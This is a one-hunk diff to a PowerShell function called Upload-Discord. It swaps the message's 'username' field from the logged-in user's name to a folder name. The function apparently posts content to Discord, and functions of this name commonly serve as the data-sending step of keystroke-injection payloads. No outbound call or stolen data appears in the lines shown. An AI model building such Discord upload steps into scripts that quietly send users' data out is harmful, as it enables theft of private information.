@@ -469,7 +469,7 @@ function Upload-Discord {
 
     # Prepare the body for the message (if any text is provided)
     $Body = @{
-        'username' = $env:username
+        'username' = $FolderName
         'content'  = $text
     }
 
